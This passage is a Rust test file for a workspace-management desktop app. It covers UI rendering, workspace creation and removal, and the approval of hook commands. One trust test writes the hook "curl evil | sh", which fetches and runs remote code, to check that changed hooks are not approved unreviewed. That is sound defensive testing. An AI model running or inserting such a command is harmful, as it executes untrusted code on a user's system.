//! Headless UI tests: every screen rendered with representative data (catches
//! layout and borrow panics that unit tests on plain data cannot, and checks
//! that the main controls are laid out with a real size), plus one mutation
//! driven end to end against the real core.
use super::{
    Shell,
    sidebar::{new_workspace_id, project_id, workspace_id},
};
use crate::{
    activity::Activity,
    jobs::{self, Done, Event, LoadError, Refreshed},
    model::{
        ConfigModel, DatabaseModel, LoadPhase, LogFile, LogsModel, Page, PitchforkModel,
        ProjectModel, ProjectSummary, SummaryStamp, Tab, WorkspaceState, WorkspaceSummary,
        workspace_summaries,
    },
    ops::{FailureHint, JobMeta, TrustChoice},
    settings::{Settings, ThemeChoice},
    state::{AppEvent, AppState, MAX_JOBS, TrustPurpose},
};
use chrono::Utc;
use devflow_core::{
    config::{
        Config, ConfigDocument, CowCapability, HooksSection, PostgresMode, PostgresSection,
        ProjectSection, ServiceConfig,
    },
    db::{BranchInfo, CowSource, RecordStatus, ServerStatus, SnapshotInfo},
    pitchfork::Detection,
    processes::{
        DaemonState, Gate, Namespace, NamespaceSource, Observation, ProcessStatus, Refusal,
    },
    project::Project,
    receipt::{DataBinding, Phase, PhaseState, Receipt, ServiceBinding, Status},
    registry::Entry,
    setup::WorkspaceStatus,
    trust::TrustState,
    worktree::Workspace,
};
use gpui_kit::{
    AppContext as _, Entity, TestAppContext, WindowHandle,
    base::Root,
    component::{ActiveTheme as _, TITLE_BAR_HEIGHT, Theme, ThemeMode, WindowExt as _},
    px, size,
    test::TestWindowExt as _,
};
use std::{cell::RefCell, path::PathBuf, rc::Rc, sync::Arc, time::Duration};
use uuid::Uuid;

pub(super) fn workspace(name: &str, is_default: bool) -> Workspace {
    Workspace {
        name: name.into(),
        branch: Some(name.into()),
        path: PathBuf::from(format!("/tmp/shop/{name}")),
        git_dir: PathBuf::from(format!("/tmp/shop/{name}/.git")),
        is_default,
        locked: false,
        missing: false,
        head: Some("abc1234".into()),
        fingerprint: None,
    }
}

pub(super) fn ready_receipt(name: &str, branch: Uuid) -> Receipt {
    let mut receipt = Receipt::new(Uuid::new_v4(), name, None);
    for phase in Phase::ALL {
        receipt.set_phase(phase, PhaseState::Done, None);
    }
    receipt.services.insert(
        "db".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: Some(branch),
                database: format!("df_{name}"),
                role: "dfl_x".into(),
                url: "postgres://x".into(),
                source: "empty".into(),
                owned: true,
            },
            None,
        ),
    );
    receipt
}

pub(super) fn branch(id: Uuid, name: &str) -> BranchInfo {
    BranchInfo {
        id,
        name: name.into(),
        db_name: format!("df_{name}"),
        role_name: "dfl_x".into(),
        source_kind: "empty".into(),
        source_id: None,
        instance_id: None,
        status: RecordStatus::Ready,
        cow: CowCapability::Verified,
        error: None,
        created_at: Utc::now(),
        size_bytes: Some(392 * 1024 * 1024),
        generation: 0,
        extras: Vec::new(),
        warnings: Vec::new(),
    }
}

pub(super) fn installed() -> Detection {
    Detection {
        path: Some(PathBuf::from("/usr/local/bin/pitchfork")),
        installed: true,
        version: Some("2.29.0".into()),
        missing_features: Vec::new(),
        problem: None,
    }
}

pub(super) fn daemon(
    name: &str,
    state: &str,
    ports: &[u16],
    url: Option<&str>,
    startable: bool,
) -> DaemonState {
    DaemonState {
        name: name.into(),
        id: (state != "not started").then(|| format!("df-0b3c9d2e-a1b2c3d4/{name}")),
        state: state.into(),
        pid: (state == "running").then_some(4242),
        ports: ports.to_vec(),
        url: url.map(str::to_string),
        error: None,
        triggers: Vec::new(),
        configured: true,
        startable,
    }
}

pub(super) fn allowed() -> Gate {
    Gate {
        allowed: true,
        reason: None,
        refusal: None,
    }
}

pub(super) fn refused(refusal: Refusal) -> Gate {
    Gate {
        allowed: false,
        reason: Some(refusal.to_string()),
        refusal: Some(refusal),
    }
}

/// What core reports for `workspace` at `path`: pitchfork runs, nothing is
/// refused, the proxy is on. Tests change the parts they are about.
pub(super) fn process_status(
    workspace: &str,
    path: &str,
    daemons: Vec<DaemonState>,
) -> ProcessStatus {
    ProcessStatus {
        workspace: workspace.into(),
        path: PathBuf::from(path),
        instance: None,
        namespace: Namespace {
            value: "df-0b3c9d2e-a1b2c3d4".into(),
            source: NamespaceSource::Devflow,
        },
        installed: true,
        version: Some("2.29.0".into()),
        configured: true,
        supervisor_up: Some(true),
        daemons,
        observation: Observation::observed(),
        proxy: Some(devflow_core::pitchfork::ProxyStatus {
            enabled: true,
            scheme: Some("https".into()),
            tld: Some("localhost".into()),
            port: Some(443),
            trusted: Some(true),
            projects: Vec::new(),
        }),
        error: None,
        can_start: allowed(),
        can_stop: allowed(),
        autostart: false,
        autostart_blocked: None,
    }
}

pub(super) fn pitchfork_model(
    workspace: &str,
    path: &str,
    daemons: Vec<DaemonState>,
) -> PitchforkModel {
    PitchforkModel {
        loaded: true,
        detection: Some(installed()),
        install: None,
        status: Some(process_status(workspace, path, daemons)),
        all: Vec::new(),
        error: None,
    }
}

/// A fully loaded project: workspaces in every state, a running server,
/// branches (one unattached), a snapshot, a daemon, config and logs.
pub(super) fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
    let entry = Entry {
        id: Uuid::new_v4(),
        name: "shop".into(),
        root: PathBuf::from("/tmp/shop"),
    };
    let key = crate::model::RequestKey {
        project: entry.id,
        epoch: 1,
    };
    let mut model = ProjectModel::new(entry, key);
    let (main_branch, feature_branch) = (Uuid::new_v4(), Uuid::new_v4());
    model.phase = LoadPhase::Ready;
    model.workspaces = vec![
        WorkspaceStatus {
            workspace: workspace("main", true),
            receipt: Some(ready_receipt("main", main_branch)),
            status: Some(Status::Ready),
            busy: false,
        },
        WorkspaceStatus {
            workspace: workspace("feature-x", false),
            receipt: Some(ready_receipt("feature-x", feature_branch)),
            status: Some(Status::NeedsAttention),
            busy: false,
        },
        WorkspaceStatus {
            workspace: workspace("adopted", false),
            receipt: None,
            status: None,
            busy: false,
        },
    ];
    model.selected_workspace = Some("main".into());
    model.database.configured = true;
    model.database.status = Some(ServerStatus {
        mode: PostgresMode::Managed,
        running: true,
        reachable: true,
        endpoint: Some("127.0.0.1:55432".into()),
        container_endpoint: None,
        server_version: Some("18.1".into()),
        file_copy_method: Some("clone".into()),
        cow: CowCapability::Verified,
        cow_source: Some(CowSource::Measured),
        problem: None,
    });
    model.database.branches = vec![
        branch(main_branch, "main"),
        branch(feature_branch, "feature-x"),
        branch(Uuid::new_v4(), "orphan"),
    ];
    model.database.snapshots = vec![SnapshotInfo {
        id: Uuid::new_v4(),
        name: "seed".into(),
        version: 2,
        db_name: "df_seed".into(),
        source_branch_id: Some(main_branch),
        status: RecordStatus::Ready,
        created_at: Utc::now(),
        warnings: Vec::new(),
    }];
    model.pitchfork = pitchfork_model(
        "main",
        "/tmp/shop/main",
        vec![
            daemon(
                "web",
                "running",
                &[3000],
                Some("https://web.main.localhost"),
                false,
            ),
            daemon("api", "not started", &[], None, true),
        ],
    );
    let config = Config {
        project: ProjectSection {
            name: "shop".into(),
            id: model.key.project,
        },
        services: std::collections::BTreeMap::from([(
            "db".to_string(),
            ServiceConfig::Postgres(PostgresSection::default()),
        )]),
        hooks: HooksSection {
            setup: vec!["mise install".into(), "bun install".into()],
            switch: vec!["bun install --frozen-lockfile".into()],
            teardown: vec!["docker compose down".into()],
            ..HooksSection::default()
        },
        ..Config::default()
    };
    model.project = Some(Arc::new(Project {
        root: PathBuf::from("/tmp/shop"),
        git_common_dir: PathBuf::from("/tmp/shop/.git"),
        config_path: PathBuf::from("/tmp/shop/devflow.toml"),
        config,
    }));
    model.trust = Some(TrustState::Untrusted {
        digest: "x".into(),
        previously_trusted: false,
        format_changed: false,
    });
    let doc = ConfigDocument {
        path: PathBuf::from("/tmp/shop/devflow.toml"),
        content: Config::template("shop", model.key.project, Some(PostgresMode::Managed)),
    };
    model.config = Some(ConfigModel::new(doc, model.entry.id, &model.entry.root));
    let log = logs_dir.join("20261010T101010-hooks.log");
    std::fs::write(&log, "$ mise install\nall good\n").unwrap();
    model.logs = LogsModel {
        files: vec![LogFile {
            name: "20261010T101010-hooks.log".into(),
            path: log.clone(),
            modified: None,
        }],
        selected: Some(log),
        content: Some(Ok("$ mise install\nall good\n".into())),
        error: None,
    };
    model
}

pub(super) struct Harness {
    pub(super) window: WindowHandle<Root>,
    pub(super) state: Entity<AppState>,
    pub(super) shell: Entity<Shell>,
}

pub(super) fn open(cx: &mut TestAppContext, install: impl FnOnce(&mut AppState)) -> Harness {
    cx.update(|cx| {
        gpui_kit::init(cx);
        crate::actions::init(cx);
    });
    let state = cx.new(|_| AppState::for_test(Settings::default()));
    cx.update(|cx| state.update(cx, |s, _| install(s)));
    let for_shell = state.clone();
    let (window, shell) = cx.update(|cx| {
        gpui_kit::open_window(
            gpui_kit::WindowOptions {
                window_bounds: Some(gpui_kit::WindowBounds::Windowed(gpui_kit::Bounds {
                    origin: Default::default(),
                    size: size(px(1240.), px(800.)),
                })),
                ..Default::default()
            },
            cx,
            move |window, cx| cx.new(|cx| Shell::new(for_shell, window, cx)),
        )
        .expect("open window")
    });
    Harness {
        window: window.downcast::<Root>().expect("root"),
        state,
        shell,
    }
}

pub(super) fn install_loaded(state: &mut AppState) {
    let dir = tempfile::tempdir().unwrap();
    let model = loaded_model(dir.path());
    state.entries = vec![model.entry.clone()];
    let entry = model.entry.clone();
    state.selection.select(entry);
    *state.selection.current_mut().unwrap() = ProjectModel {
        key: state.selection.current().unwrap().key,
        ..model
    };
    // Keep the log file alive for the test's duration.
    std::mem::forget(dir);
}

pub(super) fn frame(
    cx: &mut TestAppContext,
    h: &Harness,
    check: impl FnOnce(&mut gpui_kit::Window),
) {
    cx.update_window(h.window.into(), |_, window, cx| {
        window.render_frame(cx);
        check(window);
    })
    .unwrap();
}

#[gpui_kit::test]
fn every_tab_renders_with_data(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |window| {
        assert!(window.find("new-workspace").visible(), "workspaces toolbar");
        assert!(window.find("refresh").visible(), "header");
        // Rows render with their action buttons (table has a real size).
        assert!(
            window.find(("remove", 1usize)).visible(),
            "row action buttons"
        );
    });
    for (tab, probe) in [
        (Tab::Data, "server-up"),
        (Tab::Config, "config-save"),
        (Tab::Logs, "log"),
    ] {
        cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(tab, cx)));
        frame(cx, &h, |window| {
            let found = if probe == "log" {
                window.try_find(("log", 0usize))
            } else {
                window.try_find(probe)
            };
            assert!(
                found.is_some_and(|e| e.visible()),
                "{tab:?}: {probe} is laid out"
            );
        });
    }
    cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Daemons, cx)));
    frame(cx, &h, |window| {
        for id in ["daemons-start", "daemons-stop", "daemons-restart"] {
            assert!(window.find(id).visible(), "{id}: the workspace actions");
        }
        assert!(
            window.find(("daemon-start", 0usize)).visible(),
            "daemon row actions"
        );
        assert!(
            window.find(("daemon-url", 0usize)).visible(),
            "the proxy URL is a link"
        );
    });
    cx.update(|cx| h.state.update(cx, |s, cx| s.set_page(Page::Settings, cx)));
    frame(cx, &h, |window| {
        assert!(window.find("save-settings").visible());
    });
}

#[gpui_kit::test]
fn dialogs_open_from_the_workspaces_tab(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click("new-workspace", cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(
            window.find("dialog").visible(),
            "New workspace opens a dialog"
        )
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        assert!(
            window.has_focused_input(cx),
            "the name field has the cursor"
        );
        window.press("escape", cx)
    })
    .unwrap();
    // Removing a non-default workspace shows what will happen.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(("remove", 1usize), cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.find("dialog").visible());
        assert!(window.find("delete-branch").visible(), "remove options");
    });
}

#[gpui_kit::test]
fn activity_panel_follows_progress(cx: &mut TestAppContext) {
    let h = open(cx, |state| {
        install_loaded(state);
        let key = state.selection.current().unwrap().key;
        let mut activity = Activity::new(key, "Create workspace feature-y");
        activity.apply([
            Event::Phase {
                phase: Phase::Services,
                state: PhaseState::Started,
                detail: None,
            },
            Event::Line("bun install".into()),
        ]);
        state.activity = Some(activity);
    });
    frame(cx, &h, |window| {
        assert!(window.find("new-workspace").visible());
    });
}

#[gpui_kit::test]
fn project_states_without_data_render(cx: &mut TestAppContext) {
    let h = open(cx, |state| {
        let entry = Entry {
            id: Uuid::nil(),
            name: "devflow-slim".into(),
            root: PathBuf::from("/tmp/devflow-slim"),
        };
        state.entries = vec![entry.clone()];
        state.selection.select(entry);
        state.selection.current_mut().unwrap().phase = LoadPhase::NotInitialized;
    });
    frame(cx, &h, |window| {
        assert!(window.find("initialize").visible(), "offers to initialize");
    });
    cx.update(|cx| {
        h.state.update(cx, |s, _| {
            s.selection.current_mut().unwrap().phase =
                LoadPhase::Problem(devflow_core::health::ProjectProblem {
                    kind: devflow_core::health::ProblemKind::Unreadable,
                    message: "boom".into(),
                    root: PathBuf::from("/tmp/devflow-slim"),
                    remedies: vec![devflow_core::remedy::Remedy::Retry],
                });
        })
    });
    frame(cx, &h, |window| {
        assert!(window.find("remedy-retry").visible());
    });
}

#[gpui_kit::test]
fn trust_snapshot_reset_and_initialize_dialogs_render(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});

    // Untrusted setup hooks are listed before they run.
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(
            &h.state,
            std::path::Path::new("/tmp/shop/main"),
            TrustPurpose::Setup,
            window,
            cx,
            |_, _, _| {},
        );
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.find("trust").visible(), "Trust and run");
        assert!(window.find("once").visible(), "Run once");
        assert!(window.find("skip").visible(), "Skip");
    });
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    cx.update_window(h.window.into(), |_, window, cx| {
        super::db_dialogs::open_snapshot(&h.state, window, cx);
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("snapshot").visible()));
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    cx.update_window(h.window.into(), |_, window, cx| {
        super::db_dialogs::open_reset(&h.state, window, cx);
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("reset").visible()));
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::open_initialize(&h.state, PathBuf::from("/tmp/x"), window, cx);
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("init").visible()));
}

#[gpui_kit::test]
fn deleting_a_snapshot_asks_first(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Data, cx)));
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(("delete-snapshot", 0usize), cx)
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("confirm").visible()));
}

/// A scratch repository initialized for devflow, plus an isolated registry.
pub(super) struct Scratch {
    _dirs: crate::jobs::ScratchDirs,
    pub(super) _outer: tempfile::TempDir,
    pub(super) entry: Entry,
}

/// A git repository at `repo` with one commit, initialized for devflow and
/// registered (in the registry `DEVFLOW_CONFIG_DIR` points to).
pub(super) fn init_scratch_repo(repo: &std::path::Path) -> Entry {
    std::fs::create_dir(repo).unwrap();
    for args in [
        &["init", "-q", "-b", "main"][..],
        &["commit", "-q", "--allow-empty", "-m", "init"][..],
    ] {
        let status = std::process::Command::new("git")
            .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
            .args(args)
            .current_dir(repo)
            .status()
            .unwrap();
        assert!(status.success());
    }
    let project = devflow_core::project::init(
        repo,
        devflow_core::project::InitOptions {
            name: None,
            postgres: None,
        },
    )
    .unwrap();
    Entry {
        id: project.id(),
        name: project.name().to_string(),
        root: project.root.clone(),
    }
}

pub(super) fn scratch_project() -> Scratch {
    let dirs = crate::jobs::ScratchDirs::new();
    let outer = tempfile::tempdir().unwrap();
    let entry = init_scratch_repo(&outer.path().join("shop"));
    Scratch {
        _dirs: dirs,
        _outer: outer,
        entry,
    }
}

/// Another project in the same scratch registry.
pub(super) fn another_scratch_project(scratch: &Scratch, name: &str) -> Entry {
    init_scratch_repo(&scratch._outer.path().join(name))
}

/// Drive the executor (and its fake clock) until `done` holds.
pub(super) fn settle(cx: &mut TestAppContext, h: &Harness, done: impl Fn(&AppState) -> bool) {
    for _ in 0..200 {
        cx.executor()
            .advance_clock(std::time::Duration::from_millis(150));
        cx.run_until_parked();
        if cx.read_entity(&h.state, |s, _| done(s)) {
            return;
        }
    }
    let report = cx.read_entity(&h.state, |s, _| {
        format!(
            "busy={:?} activity={:?}",
            s.busy(),
            s.activity
                .as_ref()
                .map(|a| (&a.title, &a.outcome, a.log.text()))
        )
    });
    panic!("the UI never settled: {report}");
}

pub(super) fn open_scratch(cx: &mut TestAppContext, scratch: &Scratch) -> Harness {
    let entry = scratch.entry.clone();
    let h = open(cx, |state| {
        state.inflight = 0;
        state.entries = vec![entry.clone()];
        state.selection.select(entry);
    });
    cx.update(|cx| h.state.update(cx, |s, cx| s.refresh(cx)));
    settle(cx, &h, |s| {
        s.selection
            .current()
            .is_some_and(|m| m.phase == LoadPhase::Ready && !m.workspaces.is_empty())
    });
    h
}

fn create_workspace(cx: &mut TestAppContext, h: &Harness, name: &'static str) {
    use crate::ops::TrustChoice;
    let in_flight = cx.update(|cx| {
        h.state.update(cx, |s, _| {
            s.selection.current_mut().unwrap().begin_refresh()
        })
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            s.create_workspace(name.into(), None, None, TrustChoice::NotNeeded, window, cx)
        });
    })
    .unwrap();
    assert!(
        cx.read_entity(&h.state, |s, _| s.busy().is_some()),
        "the project is locked while the job runs"
    );
    assert!(
        !cx.read_entity(&h.state, |s, _| s
            .selection
            .current()
            .unwrap()
            .accepts(&in_flight)),
        "a refresh that was running when the job started predates it"
    );
    settle(cx, h, |s| {
        s.busy().is_none()
            && s.selection
                .current()
                .is_some_and(|m| m.workspace(name).is_some())
    });
}

#[gpui_kit::test]
fn creating_a_workspace_runs_end_to_end(cx: &mut TestAppContext) {
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-a");

    cx.read_entity(&h.state, |s, _| {
        let activity = s.activity.as_ref().expect("the operation left its output");
        assert!(
            matches!(activity.outcome, Some(Ok(_))),
            "{:?}",
            activity.outcome
        );
        assert!(
            activity
                .phases
                .iter()
                .any(|(p, st, _)| *p == Phase::Materialize && *st == PhaseState::Done)
        );
        assert!(activity.log.text().contains("[materialize]"));
        let model = s.selection.current().unwrap();
        assert_eq!(
            model.selected_workspace.as_deref(),
            Some("feature-a"),
            "the new workspace is selected"
        );
    });
}

#[gpui_kit::test]
fn force_is_offered_only_after_a_protection_error(cx: &mut TestAppContext) {
    use crate::ops::{RemoveChoice, TrustChoice};
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-b");
    let path = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .workspace("feature-b")
            .unwrap()
            .workspace
            .path
            .clone()
    });
    std::fs::write(path.join("unsaved.txt"), "work in progress").unwrap();
    let target = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .workspace_ref("feature-b")
            .unwrap()
    });

    // A dirty worktree is refused without --force ...
    cx.update_window(h.window.into(), |_, window, cx| {
        // The toast stack only lets the newest toast take clicks.
        window.clear_notifications(cx);
        h.state.update(cx, |s, cx| {
            s.remove_workspace(
                target.clone(),
                RemoveChoice::default(),
                TrustChoice::NotNeeded,
                window,
                cx,
            )
        });
    })
    .unwrap();
    settle(cx, &h, |s| s.busy().is_none());
    cx.read_entity(&h.state, |s, _| {
        let outcome = &s.activity.as_ref().unwrap().outcome;
        assert!(
            matches!(outcome, Some(Err(e)) if e.contains("uncommitted changes")),
            "{outcome:?}"
        );
        assert!(
            s.selection
                .current()
                .unwrap()
                .workspace("feature-b")
                .is_some(),
            "nothing was removed"
        );
    });

    // ... and the failure toast offers a forced removal (once it finished sliding in).
    // The slide-in uses GPUI's wall-clock animation, not the test clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, &h, |window| {
        assert!(window.find("force-remove").visible())
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        window.hover("force-remove", cx);
        window.click("force-remove", cx);
    })
    .unwrap();
    cx.run_until_parked();
    frame(cx, &h, |window| {
        assert!(window.find("remove").visible(), "force dialog is open")
    });
    // Dialogs also slide in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(300));
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| window.click("remove", cx))
        .unwrap();
    settle(cx, &h, |s| {
        s.busy().is_none()
            && s.selection
                .current()
                .is_some_and(|m| m.workspace("feature-b").is_none())
    });
    assert!(!path.exists(), "the worktree directory is gone");
}

// ---- regressions from the code review ---------------------------------------

pub(super) fn update<R>(
    cx: &mut TestAppContext,
    h: &Harness,
    f: impl FnOnce(&mut AppState, &mut gpui_kit::Context<AppState>) -> R,
) -> R {
    cx.update(|cx| h.state.update(cx, f))
}

fn select_other_project(state: &mut AppState) {
    let entry = Entry {
        id: Uuid::new_v4(),
        name: "other".into(),
        root: PathBuf::from("/tmp/other"),
    };
    state.entries.push(entry.clone());
    state.selection.select(entry);
    let model = state.selection.current_mut().unwrap();
    model.phase = LoadPhase::Ready;
    // It has a workspace named like one of "shop"'s, somewhere else.
    model.workspaces = ["main", "feature-x"]
        .into_iter()
        .map(|name| WorkspaceStatus {
            workspace: Workspace {
                path: PathBuf::from(format!("/tmp/other/{name}")),
                git_dir: PathBuf::from(format!("/tmp/other/{name}/.git")),
                ..workspace(name, name == "main")
            },
            receipt: None,
            status: None,
            busy: false,
        })
        .collect();
    model.selected_workspace = Some("main".into());
}

#[gpui_kit::test]
fn a_job_that_outlives_the_first_tick_still_releases_the_project(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let (tx, rx) = std::sync::mpsc::sync_channel(jobs::EVENT_QUEUE);
    let key = cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key);
    let in_flight = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            // What `start_job` sets up, with a channel the test controls.
            s.mutating.insert(key.project, "Slow job".into());
            s.inflight += 1;
            s.activity = Some(Activity::new(key, "Slow job"));
            s.watch_job(
                key,
                JobMeta::new("Slow job", FailureHint::None),
                rx,
                None,
                window,
                cx,
            );
        });
    })
    .unwrap();

    // Several ticks pass with output but no result: the job is still running.
    for step in 0..6 {
        tx.send(Event::Line(format!("step {step}"))).unwrap();
        cx.executor().advance_clock(Duration::from_millis(150));
        cx.run_until_parked();
        assert!(
            cx.read_entity(&h.state, |s, _| s.busy().is_some()),
            "still running after tick {step}"
        );
    }
    cx.executor().advance_clock(Duration::from_millis(150));
    cx.run_until_parked();
    cx.read_entity(&h.state, |s, _| {
        let text = s.activity.as_ref().unwrap().log.text();
        assert!(text.contains("step 5"), "{text}");
    });

    // The result arrives late and must still be applied.
    tx.send(Event::Finished(Ok(Done {
        summary: "All done".into(),
        ..Default::default()
    })))
    .unwrap();
    settle(cx, &h, |s| s.busy().is_none());
    cx.read_entity(&h.state, |s, _| {
        assert!(matches!(
            s.activity.as_ref().unwrap().outcome,
            Some(Ok(ref done)) if done.summary == "All done"
        ));
        assert_eq!(s.inflight, MAX_JOBS, "the job slot is free again");
        assert!(
            !s.selection.current().unwrap().accepts(&in_flight),
            "a refresh started before the job ended is stale"
        );
    });
}

#[gpui_kit::test]
fn a_job_that_vanishes_without_a_result_does_not_keep_the_project_locked(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let (tx, rx) = std::sync::mpsc::sync_channel(jobs::EVENT_QUEUE);
    let key = cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key);
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            s.mutating.insert(key.project, "Doomed".into());
            s.inflight += 1;
            s.watch_job(
                key,
                JobMeta::new("Doomed", FailureHint::None),
                rx,
                None,
                window,
                cx,
            );
        });
    })
    .unwrap();
    drop(tx);
    settle(cx, &h, |s| s.busy().is_none());
}

/// The commands of a hook phase of a reviewed scope.
fn runs(entries: &[devflow_core::trust::HookScope]) -> Vec<&str> {
    entries.iter().map(|e| e.run.as_str()).collect()
}

#[gpui_kit::test]
fn the_trust_dialog_shows_the_whole_hooks_section_that_trusting_approves(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
    let recorded = answers.clone();
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(
            &h.state,
            std::path::Path::new("/tmp/shop/main"),
            TrustPurpose::Setup,
            window,
            cx,
            move |choice, _, _| recorded.borrow_mut().push(choice),
        );
    })
    .unwrap();
    frame(cx, &h, |window| {
        for section in [
            "trust-setup",
            "trust-switch",
            "trust-teardown",
            "trust-timeout-per-command",
        ] {
            assert!(window.find(section).visible(), "{section} is listed");
        }
    });
    // Dialogs slide in on the wall clock.
    std::thread::sleep(Duration::from_millis(300));
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| window.click("once", cx))
        .unwrap();
    cx.run_until_parked();
    let reviewed = cx.read_entity(&h.state, |s, _| {
        devflow_core::trust::scope(s.selection.current().unwrap().project.as_ref().unwrap())
    });
    assert_eq!(runs(&reviewed.hooks.teardown), ["docker compose down"]);
    assert_eq!(
        *answers.borrow(),
        [TrustChoice::Reviewed(Box::new(reviewed))],
        "'Run once' runs exactly the content that was shown"
    );
}

#[gpui_kit::test]
fn a_trust_answer_is_dropped_when_another_project_was_selected(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
    let recorded = answers.clone();
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(
            &h.state,
            std::path::Path::new("/tmp/shop/main"),
            TrustPurpose::Setup,
            window,
            cx,
            move |choice, _, _| recorded.borrow_mut().push(choice),
        );
    })
    .unwrap();
    std::thread::sleep(Duration::from_millis(300));
    frame(cx, &h, |_| {});
    // The selection moves on while the question is open.
    update(cx, &h, |s, cx| {
        select_other_project(s);
        cx.notify();
    });
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| window.click("once", cx))
        .unwrap();
    cx.run_until_parked();
    assert!(
        answers.borrow().is_empty(),
        "the answer was about the other project: {:?}",
        answers.borrow()
    );
}

#[test]
fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
    use crate::ops::{Approval, approve_reviewed};
    use devflow_core::{project::Project, trust};

    let scratch = scratch_project();
    let root = scratch.entry.root.clone();
    let file = root.join("devflow.toml");
    let write_hooks = |setup: &str| {
        let text = std::fs::read_to_string(&file).unwrap();
        let base = text.split("[hooks]").next().unwrap();
        std::fs::write(
            &file,
            format!(
                "{base}[hooks]\nsetup = [{setup}]\nswitch = [\"echo switch\"]\nteardown = [\"echo bye\"]\n"
            ),
        )
        .unwrap();
    };
    write_hooks("\"echo one\"");
    let project = Project::open(&root).unwrap();
    let reviewed = trust::scope(&project);
    assert_eq!(runs(&reviewed.hooks.setup), ["echo one"]);
    assert_eq!(runs(&reviewed.hooks.switch), ["echo switch"]);
    assert_eq!(runs(&reviewed.hooks.teardown), ["echo bye"]);
    assert!(matches!(
        trust::state(&project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));

    // The hooks change after they were shown: nothing is approved, and the
    // new content comes back to be reviewed.
    write_hooks("\"echo one\", \"curl evil | sh\"");
    let Approval::Changed {
        message,
        project: fresh,
        scope,
    } = approve_reviewed(&project, &root, &reviewed)
    else {
        panic!("a changed [hooks] section must not be approved");
    };
    assert!(message.contains("changed"), "{message}");
    assert!(runs(&scope.hooks.setup).contains(&"curl evil | sh"));
    assert!(matches!(
        trust::state(&fresh).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));

    // Reviewing the new content and approving it works.
    assert!(matches!(
        approve_reviewed(&fresh, &root, &scope),
        Approval::Approved
    ));
    assert_eq!(trust::state(&fresh).unwrap(), trust::TrustState::Trusted);
}

#[gpui_kit::test]
fn trust_and_run_approves_what_was_shown_and_reopens_when_the_hooks_changed(
    cx: &mut TestAppContext,
) {
    use devflow_core::trust;
    let scratch = scratch_project();
    let root = scratch.entry.root.clone();
    let file = root.join("devflow.toml");
    let write_hooks = |setup: &str| {
        let text = std::fs::read_to_string(&file).unwrap();
        let base = text.split("[hooks]").next().unwrap();
        std::fs::write(&file, format!("{base}[hooks]\nsetup = [{setup}]\n")).unwrap();
    };
    write_hooks("\"echo one\"");
    let h = open_scratch(cx, &scratch);
    let model_trust = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            let project = s.selection.current().unwrap().project.clone().unwrap();
            (trust::state(&project).unwrap(), trust::scope(&project))
        })
    };
    assert!(matches!(
        model_trust(cx).0,
        trust::TrustState::Untrusted { .. }
    ));

    let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
    let recorded = answers.clone();
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(
            &h.state,
            &root,
            TrustPurpose::Setup,
            window,
